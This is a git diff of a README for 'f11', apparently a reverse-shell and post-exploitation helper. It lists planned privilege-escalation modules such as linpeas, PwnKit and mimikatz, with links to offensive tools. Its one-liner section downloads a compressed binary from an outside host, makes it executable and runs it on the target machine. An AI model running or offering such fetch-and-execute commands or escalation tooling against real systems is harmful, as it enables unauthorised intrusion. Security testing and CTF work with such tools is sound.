@@ -1,15 +1,27 @@
 # f11
 *revshellpal*
 
-### TODO
+### TODO - Modules to support
 
-- linpeas (all peas)
-  - other similar enum?
+- linpeas (other peas?)
+  - https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
 - pwnkit
+  - https://github.com/ly4k/PwnKit
 - mimikatz (windows)
+  - https://github.com/ParrotSec/mimikatz
 - SUID/SUDO/CAP/
-- SHELL
+  - https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
 
+
+### Other modules?
+- https://github.com/mzet-/linux-exploit-suggester
+- https://github.com/diego-treitos/linux-smart-enumeration
+- https://github.com/linted/linuxprivchecker
+- custom?
+  - https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+
+
+Command ideas ...
 
 ```
 💀 Ӻ11> linpeas
@@ -35,8 +47,7 @@ charlie@galactica:/tmp$ exit
 ### Oneliner
 
 ```bash
-rm /tmp/f11; curl -sL https://f11snipe.cloud/f11.xz -o /tmp/f11.xz && xz -d /tmp/f11.xz && chmod +x /tmp/f11 && /tmp/f11
-rm /tmp/f11*; curl -sL http://localhost:8000/dist/f11.xz -o /tmp/f11.xz && xz -d /tmp/f11.xz && chmod +x /tmp/f11 && /tmp/f11 2>&1 >> /tmp/f11.log &
+rm /tmp/f11; curl -sL https://f11snipe.sh/f11.xz -o /tmp/f11.xz && xz -d /tmp/f11.xz && chmod +x /tmp/f11 && /tmp/f11
 ```
 
 
